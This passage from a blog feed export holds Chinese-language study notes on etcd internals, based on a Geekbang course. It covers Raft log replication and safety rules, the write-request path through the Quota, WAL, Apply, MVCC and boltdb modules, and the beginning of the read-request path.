它的消息类型是MsgProp。</p><p>Leader的Raft模块获取到MsgProp提案消息后，为此提案生成一个日志条目，追加到未持久化、不稳定的Raft日志中，随后会遍历集群Follower列表和进度信息，为每个Follower生成追加（MsgApp）类型的RPC消息，此消息中包含待复制给Follower的日志条目。</p><p>这里就出现两个疑问了。第一，Leader是如何知道从哪个索引位置发送日志条目给Follower，以及Follower已复制的日志最大索引是多少呢？第二，日志条目什么时候才会追加到稳定的Raft日志中呢？Raft模块负责持久化吗？</p><p>首先我来给你介绍下什么是Raft日志。下图是Raft日志复制过程中的日志细节图，简称日志图1。</p><p>在日志图中，最上方的是日志条目序号&#x2F;索引，日志由有序号标识的一个个条目组成，每个日志条目内容保存了Leader任期号和提案内容。最开始的时候，A节点是Leader，任期号为1，A节点crash后，B节点通过选举成为新的Leader， 任期号为2。</p><p>日志图1描述的是hello日志条目未提交前的各节点Raft日志状态。</p><p><img src="https://static001.geekbang.org/resource/image/3d/87/3dd2b6042e6e0cc86f96f24764b7f587.png?wh=1920*1003" alt="img"></p><p>现在就可以来回答第一个疑问了。Leader会维护两个核心字段来追踪各个Follower的进度信息，一个字段是NextIndex， 它表示Leader发送给Follower节点的下一个日志条目索引。一个字段是MatchIndex， 它表示Follower节点已复制的最大日志条目的索引，比如上面的日志图1中C节点的已复制最大日志条目索引为5，A节点为4。</p><p>再看第二个疑问。etcd Raft模块设计实现上抽象了网络、存储、日志等模块，它本身并不会进行网络、存储相关的操作，上层应用需结合自己业务场景选择内置的模块或自定义实现网络、存储、日志等模块。</p><p>上层应用通过Raft模块的输出接口（如Ready结构），获取到待持久化的日志条目和待发送给Peer节点的消息后（如上面的MsgApp日志消息），需持久化日志条目到自定义的WAL模块，通过自定义的网络模块将消息发送给Peer节点。</p><p>日志条目持久化到稳定存储中后，这时候你就可以将日志条目追加到稳定的Raft日志中。即便这个日志是内存存储，节点重启时也不会丢失任何日志条目，因为WAL模块已持久化此日志条目，可通过它重建Raft日志。</p><p>etcd Raft模块提供了一个内置的内存存储（MemoryStorage）模块实现，etcd使用的就是它，Raft日志条目保存在内存中。网络模块并未提供内置的实现，etcd基于HTTP协议实现了peer节点间的网络通信，并根据消息类型，支持选择pipeline、stream等模式发送，显著提高了网络吞吐量、降低了延时。</p><p>解答完以上两个疑问后，我们继续分析etcd是如何与Raft模块交互，获取待持久化的日志条目和发送给peer节点的消息。</p><p>正如刚刚讲到的，Raft模块输入是Msg消息，输出是一个Ready结构，它包含待持久化的日志条目、发送给peer节点的消息、已提交的日志条目内容、线性查询结果等Raft输出核心信息。</p><p>etcdserver模块通过channel从Raft模块获取到Ready结构后（流程图中的序号3流程），因B节点是Leader，它首先会通过基于HTTP协议的网络模块将追加日志条目消息（MsgApp）广播给Follower，并同时将待持久化的日志条目持久化到WAL文件中（流程图中的序号4流程），最后将日志条目追加到稳定的Raft日志存储中（流程图中的序号5流程）。</p><p>各个Follower收到追加日志条目（MsgApp）消息，并通过安全检查后，它会持久化消息到WAL日志中，并将消息追加到Raft日志存储，随后会向Leader回复一个应答追加日志条目（MsgAppResp）的消息，告知Leader当前已复制的日志最大索引（流程图中的序号6流程）。</p><p>Leader收到应答追加日志条目（MsgAppResp）消息后，会将Follower回复的已复制日志最大索引更新到跟踪Follower进展的Match Index字段，如下面的日志图2中的Follower C MatchIndex为6，Follower A为5，日志图2描述的是hello日志条目提交后的各节点Raft日志状态。</p><p><img src="https://static001.geekbang.org/resource/image/eb/63/ebbf739a94f9300a85f21da7e55f1e63.png?wh=1920*994" alt="img"></p><p>最后Leader根据Follower的MatchIndex信息，计算出一个位置，如果这个位置已经被一半以上节点持久化，那么这个位置之前的日志条目都可以被标记为已提交。</p><p>在我们这个案例中日志图2里6号索引位置之前的日志条目已被多数节点复制，那么他们状态都可被设置为已提交。Leader可通过在发送心跳消息（MsgHeartbeat）给Follower节点时，告知它已经提交的日志索引位置。</p><p>最后各个节点的etcdserver模块，可通过channel从Raft模块获取到已提交的日志条目（流程图中的序号7流程），应用日志条目内容到存储状态机（流程图中的序号8流程），返回结果给client。</p><p>通过以上流程，Leader就完成了同步日志条目给Follower的任务，一个日志条目被确定为已提交的前提是，它需要被Leader同步到一半以上节点上。以上就是etcd Raft日志复制的核心原理。</p><h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>如果在上面的日志图2中，Leader B在应用日志指令put hello为world到状态机，并返回给client成功后，突然crash了，那么Follower A和C是否都有资格选举成为Leader呢？</p><p>从日志图2中我们可以看到，如果A成为了Leader那么就会导致数据丢失，因为它并未含有刚刚client已经写入成功的put hello为world指令。</p><p>Raft算法如何确保面对这类问题时不丢数据和各节点数据一致性呢？</p><p>这就是Raft的第三个子问题需要解决的。Raft通过给选举和日志复制增加一系列规则，来实现Raft算法的安全性。</p><h3 id="选举规则"><a href="#选举规则" class="headerlink" title="选举规则"></a>选举规则</h3><p>当节点收到选举投票的时候，需检查候选者的最后一条日志中的任期号，若小于自己则拒绝投票。如果任期号相同，日志却比自己短，也拒绝为其投票。</p><p>比如在日志图2中，Folllower A和C任期号相同，但是Follower C的数据比Follower A要长，那么在选举的时候，Follower C将拒绝投票给A， 因为它的数据不是最新的。</p><p>同时，对于一个给定的任期号，最多只会有一个leader被选举出来，leader的诞生需获得集群一半以上的节点支持。每个节点在同一个任期内只能为一个节点投票，节点需要将投票信息持久化，防止异常重启后再投票给其他节点。</p><p>通过以上规则就可防止日志图2中的Follower A节点成为Leader。</p><h3 id="日志复制规则"><a href="#日志复制规则" class="headerlink" title="日志复制规则"></a>日志复制规则</h3><p>在日志图2中，Leader B返回给client成功后若突然crash了，此时可能还并未将6号日志条目已提交的消息通知到Follower A和C，那么如何确保6号日志条目不被新Leader删除呢？ 同时在etcd集群运行过程中，Leader节点若频繁发生crash后，可能会导致Follower节点与Leader节点日志条目冲突，如何保证各个节点的同Raft日志位置含有同样的日志条目？</p><p>以上各类异常场景的安全性是通过Raft算法中的Leader完全特性和只附加原则、日志匹配等安全机制来保证的。</p><p><strong>Leader完全特性</strong> 是指如果某个日志条目在某个任期号中已经被提交，那么这个条目必然出现在更大任期号的所有Leader中。</p><p>Leader只能追加日志条目，不能删除已持久化的日志条目（ <strong>只附加原则</strong>），因此Follower C成为新Leader后，会将前任的6号日志条目复制到A节点。</p><p>为了保证各个节点日志一致性，Raft算法在追加日志的时候，引入了一致性检查。Leader在发送追加日志RPC消息时，会把新的日志条目紧接着之前的条目的索引位置和任期号包含在里面。Follower节点会检查相同索引位置的任期号是否与Leader一致，一致才能追加，这就是 <strong>日志匹配特性</strong>。它本质上是一种归纳法，一开始日志空满足匹配特性，随后每增加一个日志条目时，都要求上一个日志条目信息与Leader一致，那么最终整个日志集肯定是一致的。</p><p>通过以上的Leader选举限制、Leader完全特性、只附加原则、日志匹配等安全特性，Raft就实现了一个可严格通过数学反证法、归纳法证明的高可用、一致性算法，为etcd的安全性保驾护航。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Raft虽然诞生晚，但它却是共识算法里面在工程界应用最广泛的。它将一个复杂问题拆分成三个子问题，分别是<strong>Leader选举、日志复制和安全性。</strong></p><p><strong>Raft通过心跳机制、随机化等实现了Leader选举，只要集群半数以上节点存活可相互通信，etcd就可对外提供高可用服务。</strong></p><p>Raft日志复制确保了etcd多节点间的数据一致性，我通过一个etcd日志复制整体流程图为你详细介绍了etcd写请求从提交到Raft模块，到被应用到状态机执行的各个流程，剖析了日志复制的核心原理，即一个日志条目只有被Leader同步到一半以上节点上，此日志条目才能称之为成功复制、已提交。Raft的安全性，通过对Leader选举和日志复制增加一系列规则，保证了整个集群的一致性、完整性。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03.etcd写请求的执行过程</title>
    <link href="/2022/10/02/03-etcd%E5%86%99%E8%AF%B7%E6%B1%82%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B/"/>
    <url>/2022/10/02/03-etcd%E5%86%99%E8%AF%B7%E6%B1%82%E7%9A%84%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="etcd-写请求的执行过程"><a href="#etcd-写请求的执行过程" class="headerlink" title="etcd 写请求的执行过程"></a>etcd 写请求的执行过程</h2><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>etcd 一个写请求执行流程又是怎样的呢？在执行写请求过程中，如果进程 crash 了，如何保证数据不丢、命令不重复执行呢？</p><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p><img src="https://static001.geekbang.org/resource/image/8b/72/8b6dfa84bf8291369ea1803387906c72.png?wh=1920*1265" alt="img"></p><p>为了能够更直观地理解 etcd 的写请求流程，在如上的架构图中，用序号标识了下面的一个 put hello 为 world 的写请求的简要执行流程，从整体上快速了解一个写请求的全貌。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">etcdctl <span class="hljs-keyword">put</span> hello world <span class="hljs-comment">--endpoints http://127.0.0.1:2379</span><br>OK<br></code></pre></td></tr></table></figure><p>首先 client 端通过负载均衡算法选择一个 etcd 节点，发起 gRPC 调用。然后 etcd 节点收到请求后经过 gRPC 拦截器、Quota 模块后，进入 KVServer 模块，KVServer 模块向 Raft 模块提交一个提案，提案内容为“大家好，请使用 put 方法执行一个 key 为 hello，value 为 world 的命令”。</p><p>随后此提案通过 Raft HTTP 网络模块转发、经过集群多数节点持久化后，状态会变成已提交，etcdserver 从 Raft 模块获取已提交的日志条目，传递给 Apply 模块，Apply 模块通过 MVCC 模块执行提案内容，更新状态机。</p><p>与读流程不一样的是写流程还涉及 Quota、WAL、Apply 三个模块。crash-safe 及幂等性也正是基于 WAL 和 Apply 流程的 consistent index 等实现的</p><p>下面就让我们沿着写请求执行流程图，从 0 到 1 分析一个 key-value 是如何安全、幂等地持久化到磁盘的。</p><h3 id="Quota-模块"><a href="#Quota-模块" class="headerlink" title="Quota 模块"></a>Quota 模块</h3><p>首先是流程一 client 端发起 gRPC 调用到 etcd 节点，和读请求不一样的是，写请求需要经过流程二 db 配额（Quota）模块，它有什么功能呢？</p><p>先从此模块的一个常见错误说起，你在使用 etcd 过程中是否遇到过”etcdserver: mvcc: database space exceeded”错误呢？</p><p>它是指当前 etcd db 文件大小超过了配额，当出现此错误后，整个集群将不可写入，只读，对业务的影响非常大。</p><p><strong>哪些情况会触发这个错误呢？</strong></p><p>一方面默认 db 配额仅为 2G，当业务数据、写入 QPS、Kubernetes 集群规模增大后， etcd db 大小就可能会超过 2G。</p><p>另一方面我们知道 etcd v3 是个 MVCC 数据库，保存了 key 的历史版本，当你未配置压缩策略的时候，随着数据不断写入，db 大小会不断增大，导致超限。</p><p>最后要特别注意的是，如果使用的是 etcd 3.2.10 之前的旧版本，请注意备份可能会触发 boltdb 的一个 Bug，它会导致 db 大小不断上涨，最终达到配额限制。</p><p><strong>了解完触发 Quota 限制的原因后，再详细了解下 Quota 模块它是如何工作的。</strong></p><p>当 etcd server 收到 put&#x2F;txn 等写请求的时候，会首先检查下当前 etcd db 大小加上你请求的 key-value 大小之和是否超过了配额（quota-backend-bytes）。</p><p>如果超过了配额，它会产生一个告警（Alarm）请求，告警类型是 NO SPACE，并通过 Raft 日志同步给其它节点，告知 db 无空间了，并将告警持久化存储到 db 中。</p><p>最终，无论是 API 层 gRPC 模块还是负责将 Raft 侧已提交的日志条目应用到状态机的 Apply 模块，都拒绝写入，集群只读。</p><p><strong>那遇到这个错误时应该如何解决呢？</strong></p><p>首先当然是<strong>调大配额</strong>。具体多大合适呢？etcd 社区建议不超过 8G。遇到过这个错误的你是否还记得，为什么当你把配额（quota-backend-bytes）调大后，集群依然拒绝写入呢?</p><p>原因就是我们前面提到的 NO SPACE 告警。Apply 模块在执行每个命令的时候，都会去检查当前是否存在 NO SPACE 告警，如果有则拒绝写入。所以还需要你额外发送一个取消告警（etcdctl alarm disarm）的命令，以消除所有告警。</p><p>其次你需要<strong>检查 etcd 的压缩（compact）配置是否开启、配置是否合理</strong>。etcd 保存了一个 key 所有变更历史版本，如果没有一个机制去回收旧的版本，那么内存和 db 大小就会一直膨胀，在 etcd 里面，压缩模块负责回收旧版本的工作。</p><p>压缩模块支持按多种方式回收旧版本，比如保留最近一段时间内的历史版本。不过要注意，它仅仅是将旧版本占用的空间打个空闲（Free）标记，后续新的数据写入的时候可复用这块空间，而无需申请新的空间。</p><p>如果你需要回收空间，减少 db 大小，得使用碎片整理（defrag）， 它会遍历旧的 db 文件数据，写入到一个新的 db 文件。但是它对服务性能有较大影响，不建议你在生产集群频繁使用。</p><p>最后你需要<strong>注意配额（quota-backend-bytes）的行为</strong>，默认’0’就是使用 etcd 默认的 2GB 大小，你需要根据你的业务场景适当调优。如果你填的是个小于 0 的数，就会禁用配额功能，这可能会让你的 db 大小处于失控，导致性能下降，不建议你禁用配额。</p><h3 id="KVServer-模块"><a href="#KVServer-模块" class="headerlink" title="KVServer 模块"></a>KVServer 模块</h3><p>通过流程二的配额检查后，请求就从 API 层转发到了流程三的 KVServer 模块的 put 方法，我们知道 etcd 是基于 Raft 算法实现节点间数据复制的，因此它需要将 put 写请求内容打包成一个提案消息，提交给 Raft 模块。不过 KVServer 模块在提交提案前，还有如下的一系列检查和限速。</p><h4 id="Preflight-Check"><a href="#Preflight-Check" class="headerlink" title="Preflight Check"></a>Preflight Check</h4><p>为了保证集群稳定性，避免雪崩，任何提交到 Raft 模块的请求，都会做一些简单的限速判断。如下面的流程图所示，首先，如果 Raft 模块已提交的日志索引（committed index）比已应用到状态机的日志索引（applied index）超过了 5000，那么它就返回一个”etcdserver: too many requests”错误给 client。</p><p><img src="https://static001.geekbang.org/resource/image/dc/54/dc8e373e06f2ab5f63a7948c4a6c8554.png?wh=1164*1004" alt="img"></p><p>然后它会尝试去获取请求中的鉴权信息，若使用了密码鉴权、请求中携带了 token，如果 token 无效，则返回”auth: invalid auth token”错误给 client。</p><p>其次它会检查你写入的包大小是否超过默认的 1.5MB， 如果超过了会返回”etcdserver: request is too large”错误给给 client。</p><h4 id="Propose"><a href="#Propose" class="headerlink" title="Propose"></a>Propose</h4><p>最后通过一系列检查之后，会生成一个唯一的 ID，将此请求关联到一个对应的消息通知 channel，然后向 Raft 模块发起（Propose）一个提案（Proposal），提案内容为“大家好，请使用 put 方法执行一个 key 为 hello，value 为 world 的命令”，也就是整体架构图里的流程四。</p><p>向 Raft 模块发起提案后，KVServer 模块会等待此 put 请求，等待写入结果通过消息通知 channel 返回或者超时。etcd 默认超时时间是 7 秒（5 秒磁盘 IO 延时 +2*1 秒竞选超时时间），如果一个请求超时未返回结果，则可能会出现你熟悉的 etcdserver: request timed out 错误。</p><h3 id="WAL-模块"><a href="#WAL-模块" class="headerlink" title="WAL 模块"></a>WAL 模块</h3><p>Raft 模块收到提案后，如果当前节点是 Follower，它会转发给 Leader，只有 Leader 才能处理写请求。Leader 收到提案后，通过 Raft 模块输出待转发给 Follower 节点的消息和待持久化的日志条目，日志条目则封装了我们上面所说的 put hello 提案内容。</p><p>etcdserver 从 Raft 模块获取到以上消息和日志条目后，作为 Leader，它会将 put 提案消息广播给集群各个节点，同时需要把集群 Leader 任期号、投票信息、已提交索引、提案内容持久化到一个 WAL（Write Ahead Log）日志文件中，用于保证集群的一致性、可恢复性，也就是我们图中的流程五模块。</p><p>WAL 日志结构是怎样的呢？</p><p><img src="https://static001.geekbang.org/resource/image/47/8d/479dec62ed1c31918a7c6cab8e6aa18d.png?wh=1920*1335" alt="img"></p><p>上图是 WAL 结构，它由多种类型的 WAL 记录顺序追加写入组成，每个记录由类型、数据、循环冗余校验码组成。不同类型的记录通过 Type 字段区分，Data 为对应记录内容，CRC 为循环校验码信息。</p><p>WAL 记录类型目前支持 5 种，分别是文件元数据记录、日志条目记录、状态信息记录、CRC 记录、快照记录：</p><ul><li>文件元数据记录包含节点 ID、集群 ID 信息，它在 WAL 文件创建的时候写入；</li><li>日志条目记录包含 Raft 日志信息，如 put 提案内容；</li><li>状态信息记录，包含集群的任期号、节点投票信息等，一个日志文件中会有多条，以最后的记录为准；</li><li>CRC 记录包含上一个 WAL 文件的最后的 CRC（循环冗余校验码）信息， 在创建、切割 WAL 文件时，作为第一条记录写入到新的 WAL 文件， 用于校验数据文件的完整性、准确性等；</li><li>快照记录包含快照的任期号、日志索引信息，用于检查快照文件的准确性。</li></ul><p><strong>WAL 模块又是如何持久化一个 put 提案的日志条目类型记录呢?</strong></p><p>首先我们来看看 put 写请求如何封装在 Raft 日志条目里面。下面是 Raft 日志条目的数据结构信息，它由以下字段组成：</p><ul><li>Term 是 Leader 任期号，随着 Leader 选举增加；</li><li>Index 是日志条目的索引，单调递增增加；</li><li>Type 是日志类型，比如是普通的命令日志（EntryNormal）还是集群配置变更日志（EntryConfChange）；</li><li>Data 保存我们上面描述的 put 提案内容。</li></ul><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">Entry</span> struct &#123;<br>   <span class="hljs-type">Term</span>             uint64    `protobuf:&quot;varint，2，opt，name=<span class="hljs-type">Term</span>&quot; json:&quot;<span class="hljs-type">Term</span>&quot;`<br>   <span class="hljs-type">Index</span>            uint64    `protobuf:&quot;varint，3，opt，name=<span class="hljs-type">Index</span>&quot; json:&quot;<span class="hljs-type">Index</span>&quot;`<br>   <span class="hljs-type">Type</span>             <span class="hljs-type">EntryType</span> `protobuf:&quot;varint，1，opt，name=<span class="hljs-type">Type</span>，enum=<span class="hljs-type">Raftpb</span>.<span class="hljs-type">EntryType</span>&quot; json:&quot;<span class="hljs-type">Type</span>&quot;`<br>   <span class="hljs-type">Data</span>             []byte    `protobuf:&quot;bytes，4，opt，name=<span class="hljs-type">Data</span>&quot; json:&quot;<span class="hljs-type">Data</span>，omitempty&quot;`<br>&#125;<br></code></pre></td></tr></table></figure><p>了解完 Raft 日志条目数据结构后，我们再看 WAL 模块如何持久化 Raft 日志条目。它首先先将 Raft 日志条目内容（含任期号、索引、提案内容）序列化后保存到 WAL 记录的 Data 字段， 然后计算 Data 的 CRC 值，设置 Type 为 Entry Type， 以上信息就组成了一个完整的 WAL 记录。</p><p>最后计算 WAL 记录的长度，顺序先写入 WAL 长度（Len Field），然后写入记录内容，调用 fsync 持久化到磁盘，完成将日志条目保存到持久化存储中。</p><p>当一半以上节点持久化此日志条目后， Raft 模块就会通过 channel 告知 etcdserver 模块，put 提案已经被集群多数节点确认，提案状态为已提交，你可以执行此提案内容了。</p><p>于是进入流程六，etcdserver 模块从 channel 取出提案内容，添加到先进先出（FIFO）调度队列，随后通过 Apply 模块按入队顺序，异步、依次执行提案内容。</p><h3 id="Apply-模块"><a href="#Apply-模块" class="headerlink" title="Apply 模块"></a>Apply 模块</h3><p>执行 put 提案内容对应我们架构图中的流程七，其细节图如下。那么 Apply 模块是如何执行 put 请求的呢？若 put 请求提案在执行流程七的时候 etcd 突然 crash 了， 重启恢复的时候，etcd 是如何找回异常提案，再次执行的呢？</p><p><img src="https://static001.geekbang.org/resource/image/7f/5b/7f13edaf28yy7a6698e647104771235b.png?wh=1920*641" alt="img"></p><p>核心就是上面介绍的 WAL 日志，因为提交给 Apply 模块执行的提案已获得多数节点确认、持久化，etcd 重启时，会从 WAL 中解析出 Raft 日志条目内容，追加到 Raft 日志的存储中，并重放已提交的日志提案给 Apply 模块执行。</p><p><strong>然而这又引发了另外一个问题，如何确保幂等性，防止提案重复执行导致数据混乱呢?</strong></p><p>etcd 是个 MVCC 数据库，每次更新都会生成新的版本号。如果没有幂等性保护，同样的命令，一部分节点执行一次，一部分节点遭遇异常故障后执行多次，则系统的各节点一致性状态无法得到保证，导致数据混乱，这是严重故障。</p><p><strong>因此 etcd 必须要确保幂等性。怎么做呢？Apply 模块从 Raft 模块获得的日志条目信息里，是否有唯一的字段能标识这个提案？</strong></p><p>答案就是我们上面介绍 Raft 日志条目中的索引（index）字段。日志条目索引是全局单调递增的，每个日志条目索引对应一个提案， 如果一个命令执行后，我们在 db 里面也记录下当前已经执行过的日志条目索引，是不是就可以解决幂等性问题呢？</p><p>是的。但是这还不够安全，如果执行命令的请求更新成功了，更新 index 的请求却失败了，是不是一样会导致异常？</p><p>因此我们在实现上，还需要将两个操作作为原子性事务提交，才能实现幂等。etcd 通过引入一个 consistent index 的字段，来存储系统当前已经执行过的日志条目索引，实现幂等性。</p><p>Apply 模块在执行提案内容前，首先会判断当前提案是否已经执行过了，如果执行了则直接返回，若未执行同时无 db 配额满告警，则进入到 MVCC 模块，开始与持久化存储模块打交道。</p><h3 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h3><p>Apply 模块判断此提案未执行后，就会调用 MVCC 模块来执行提案内容。MVCC 主要由两部分组成，一个是内存索引模块 treeIndex，保存 key 的历史版本号信息，另一个是 boltdb 模块，用来持久化存储 key-value 数据。那么 MVCC 模块执行 put hello 为 world 命令时，它是如何构建内存索引和保存哪些数据到 db 呢？</p><h3 id="treeIndex"><a href="#treeIndex" class="headerlink" title="treeIndex"></a>treeIndex</h3><p>MVCC 的索引模块 treeIndex，当收到更新 key hello 为 world 的时候，此 key 的索引版本号信息是怎么生成的呢？需要维护、持久化存储一个全局版本号吗？</p><p>版本号（revision）在 etcd 里面发挥着重大作用，它是 etcd 的逻辑时钟。etcd 启动的时候默认版本号是 1，随着你对 key 的增、删、改操作而全局单调递增。</p><p>因为 boltdb 中的 key 就包含此信息，所以 etcd 并不需要再去持久化一个全局版本号。我们只需要在启动的时候，从最小值 1 开始枚举到最大值，未读到数据的时候则结束，最后读出来的版本号即是当前 etcd 的最大版本号 currentRevision。</p><p>MVCC 写事务在执行 put hello 为 world 的请求时，会基于 currentRevision 自增生成新的 revision 如{2,0}，然后从 treeIndex 模块中查询 key 的创建版本号、修改次数信息。这些信息将填充到 boltdb 的 value 中，同时将用户的 hello key 和 revision 等信息存储到 B-tree，也就是下面简易写事务图的流程一，整体架构图中的流程八。</p><p><img src="https://static001.geekbang.org/resource/image/a1/ff/a19a06d8f4cc5e488a114090d84116ff.png?wh=1920*1035" alt="img"></p><h3 id="boltdb"><a href="#boltdb" class="headerlink" title="boltdb"></a>boltdb</h3><p>MVCC 写事务自增全局版本号后生成的 revision{2,0}，它就是 boltdb 的 key，通过它就可以往 boltdb 写数据了，进入了整体架构图中的流程九。</p><p>boltdb 上一篇我们提过它是一个基于 B+tree 实现的 key-value 嵌入式 db，它通过提供桶（bucket）机制实现类似 MySQL 表的逻辑隔离。</p><p>在 etcd 里面你通过 put&#x2F;txn 等 KV API 操作的数据，全部保存在一个名为 key 的桶里面，这个 key 桶在启动 etcd 的时候会自动创建。</p><p>除了保存用户 KV 数据的 key 桶，etcd 本身及其它功能需要持久化存储的话，都会创建对应的桶。比如上面我们提到的 etcd 为了保证日志的幂等性，保存了一个名为 consistent index 的变量在 db 里面，它实际上就存储在元数据（meta）桶里面。</p><p>那么写入 boltdb 的 value 含有哪些信息呢？</p><p>写入 boltdb 的 value， 并不是简单的”world”，如果只存一个用户 value，索引又是保存在易失的内存上，那重启 etcd 后，我们就丢失了用户的 key 名，无法构建 treeIndex 模块了。</p><p>因此为了构建索引和支持 Lease 等特性，etcd 会持久化以下信息:</p><ul><li>key 名称；</li><li>key 创建时的版本号（create_revision）、最后一次修改时的版本号（mod_revision）、key 自身修改的次数（version）；</li><li>value 值；</li><li>租约信息（后面介绍）。</li></ul><p>boltdb value 的值就是将含以上信息的结构体序列化成的二进制数据，然后通过 boltdb 提供的 put 接口，etcd 就快速完成了将你的数据写入 boltdb，对应上面简易写事务图的流程二。</p><p>但是 put 调用成功，就能够代表数据已经持久化到 db 文件了吗？</p><p>这里需要注意的是，在以上流程中，etcd 并未提交事务（commit），因此数据只更新在 boltdb 所管理的内存数据结构中。</p><p>事务提交的过程，包含 B+tree 的平衡、分裂，将 boltdb 的脏数据（dirty page）、元数据信息刷新到磁盘，因此事务提交的开销是昂贵的。如果我们每次更新都提交事务，etcd 写性能就会较差。</p><p>那么解决的办法是什么呢？</p><p>etcd 的解决方案是合并再合并。</p><p>首先 boltdb key 是版本号，put&#x2F;delete 操作时，都会基于当前版本号递增生成新的版本号，因此属于顺序写入，可以调整 boltdb 的 bucket.FillPercent 参数，使每个 page 填充更多数据，减少 page 的分裂次数并降低 db 空间。</p><p>其次 etcd 通过合并多个写事务请求，通常情况下，是异步机制定时（默认每隔 100ms）将批量事务一次性提交（pending 事务过多才会触发同步提交）， 从而大大提高吞吐量，对应上面简易写事务图的流程三。</p><p>但是这优化又引发了另外的一个问题， 因为事务未提交，读请求可能无法从 boltdb 获取到最新数据。</p><p>为了解决这个问题，etcd 引入了一个 bucket buffer 来保存暂未提交的事务数据。在更新 boltdb 的时候，etcd 也会同步数据到 bucket buffer。因此 etcd 处理读请求的时候会优先从 bucket buffer 里面读取，其次再从 boltdb 读，通过 bucket buffer 实现读写性能提升，同时保证数据一致性。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>首先我们介绍了 Quota 模块工作原理和我们熟悉的 database space exceeded 错误触发原因，写请求导致 db 大小增加、compact 策略不合理、boltdb Bug 等都会导致 db 大小超限。</p><p>其次介绍了 WAL 模块的存储结构，它由一条条记录顺序写入组成，每个记录含有 Type、CRC、Data，每个提案被提交前都会被持久化到 WAL 文件中，以保证集群的一致性和可恢复性。</p><p>随后我们介绍了 Apply 模块基于 consistent index 和事务实现了幂等性，保证了节点在异常情况下不会重复执行重放的提案。</p><p>最后我们介绍了 MVCC 模块是如何维护索引版本号、重启后如何从 boltdb 模块中获取内存索引结构的。以及 etcd 通过异步、批量提交事务机制，以提升写 QPS 和吞吐量。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02.etcd读的执行流程</title>
    <link href="/2022/10/02/02-etcd%E8%AF%BB%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/"/>
    <url>/2022/10/02/02-etcd%E8%AF%BB%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="etcd读写请求的执行过程"><a href="#etcd读写请求的执行过程" class="headerlink" title="etcd读写请求的执行过程"></a>etcd读写请求的执行过程</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><h2 id="etcd-读请求的执行过程"><a href="#etcd-读请求的执行过程" class="headerlink" title="etcd 读请求的执行过程"></a>etcd 读请求的执行过程</h2><p>etcd 是典型的读多写少存储，在我们实际业务场景中，读一般占据 2&#x2F;3 以上的请求。为了让你对 etcd 有一个深入的理解，接下来分析一个读请求是如何执行的，了解 etcd 的核心模块，进而由点及线、由线到面地构建 etcd 的全景知识脉络。</p><p>在下面这张架构图中，用序号标识了 etcd 默认读模式（线性读）的执行流程，接下来，我们就按照这个执行流程从头开始说。</p><p><img src="https://static001.geekbang.org/resource/image/45/bb/457db2c506135d5d29a93ef0bd97e4bb.png?wh=1920*1229" alt="img"></p><h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><p>启动完 etcd 集群后，当你用 etcd 的客户端工具 etcdctl 执行一个 get hello 命令（如下）时，对应到图中流程一，etcdctl 是如何工作的呢？</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">etcdctl <span class="hljs-keyword">get</span> hello --endpoints http:<span class="hljs-comment">//127.0.0.1:2379 </span><br>hello <br>world <br></code></pre></td></tr></table></figure><p>首先，etcdctl 会对命令中的参数进行解析。我们来看下这些参数的含义，其中，参数“get”是请求的方法，它是 KVServer 模块的 API；“hello”是我们查询的 key 名；“endpoints”是我们后端的 etcd 地址，通常，生产环境下中需要配置多个 endpoints，这样在 etcd 节点出现故障后，client 就可以自动重连到其它正常的节点，从而保证请求的正常执行。</p><p>在 etcd v3.4.9 版本中，etcdctl 是通过 clientv3 库来访问 etcd server 的，clientv3 库基于 gRPC client API 封装了操作 etcd KVServer、Cluster、Auth、Lease、Watch 等模块的 API，同时还包含了负载均衡、健康探测和故障切换等特性。</p><p>在解析完请求中的参数后，etcdctl 会创建一个 clientv3 库对象，使用 KVServer 模块的 API 来访问 etcd server。</p><p>接下来，就需要为这个 get hello 请求选择一个合适的 etcd server 节点了，这里得用到负载均衡算法。在 etcd 3.4 中，clientv3 库采用的负载均衡算法为 Round-robin。针对每一个请求，Round-robin 算法通过轮询的方式依次从 endpoint 列表中选择一个 endpoint 访问 (长连接)，使 etcd server 负载尽量均衡。</p><p>关于负载均衡算法，你需要特别注意以下两点。</p><ul><li>如果你的 client 版本 &lt;&#x3D; 3.3，那么当你配置多个 endpoint 时，负载均衡算法仅会从中选择一个 IP 并创建一个连接（Pinned 